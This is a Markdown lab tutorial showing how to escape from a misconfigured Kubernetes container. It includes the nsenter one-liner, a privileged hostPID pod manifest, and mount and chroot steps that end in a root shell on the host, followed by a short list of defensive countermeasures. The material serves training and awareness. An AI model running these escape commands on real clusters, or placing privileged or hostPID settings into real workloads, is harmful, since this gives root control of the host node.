# 🧪 Container Escape in Kubernetes (for Educational Purposes Only)

## ⚠️ Disclaimer

**This lab is for training and awareness only!**  
Never attempt container escapes in unauthorized environments.

---

## 🎯 Objective

Understand how misconfigured containers can allow attackers to escape into the host system.

---

## 🧰 Prerequisites

- Kubernetes cluster (preferably local, like Minikube or kind)
- `kubectl` configured
- A pod is allowed to run in privileged mode (for simulation)

---

## Lab 1: One-Liner Kubernetes Container Escape

Duffie Cooley and Ian Coldwater pulled the following Kubernetes one-liner together the first time they met:

### Step 1: Run the one-liner

Just run this:

```bash
kubectl run r00t --restart=Never \
  -ti --rm --image lol \
  --overrides '{"spec":{"hostPID": true, \
  "containers":[{"name":"1","image":"alpine",\
  "command":["nsenter","--mount=/proc/1/ns/mnt","--",\
  "/bin/bash"],"stdin": true,"tty":true,\
  "securityContext":{"privileged":true}}]}}'
```

### Step 2: Check for root in the process namespace

```bash
r00t# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),...
```

### Step 3: Check for kernel PIDs to verify we’re in the root namespace

```bash
r00t# ps faux 
```

---

## 🔹 Lab 2: Deploy a Privileged Pod

Deploy a highly privileged pod:

```yaml
# privileged-escape-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-demo
spec:
  hostPID: true
  containers:
  - name: attacker
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
```

```bash
kubectl apply -f privileged-escape-pod.yaml
```

✅ Pod runs with `hostPID` and `privileged` mode — dangerous in production!

---

## 🔹 Lab 3: Inspect Host Processes from Inside the Pod

```bash
kubectl exec -it escape-demo -- sh
```

Inside the container:

```bash
ps aux
```

✅ **Expected:** You see host system processes.

---

## 🔹 Lab 4: Access the Host Filesystem

Still inside the container:

```bash
ls /host
```

(May fail if `/host` is not mounted — so let's try mounting it.)

Mount the host root filesystem:

```bash
mkdir /mnt
mount /dev/sda1 /mnt
ls /mnt
```

✅ Gain access to the host filesystem.

---

## 🔹 Lab 5: Spawn a Host Shell

Inside the container (dangerous):

```bash
chroot /mnt /bin/sh
```

✅ **You are now running as root on the host** from inside the container.

---

## 🔹 Lab 6: Defensive Countermeasures

- **Never** allow `privileged: true` unless absolutely necessary.
- **Do not** enable `hostPID`, `hostNetwork`, or `hostIPC` unless required.
- Use **PodSecurityAdmission** with `restricted` level.
- Enforce **AppArmor**, **Seccomp**, and **readOnlyRootFilesystem**.
- Regularly audit pods for excessive privileges.

---

## 🔹 Lab 7: Clean Up

```bash
kubectl delete pod escape-demo
```

---

## ✅ Wrap-Up

- ✅ Demonstrated how container misconfiguration can lead to host escape
- ✅ Understood the power of `privileged` and `hostPID`
- ✅ Learned prevention strategies for real-world defense

---
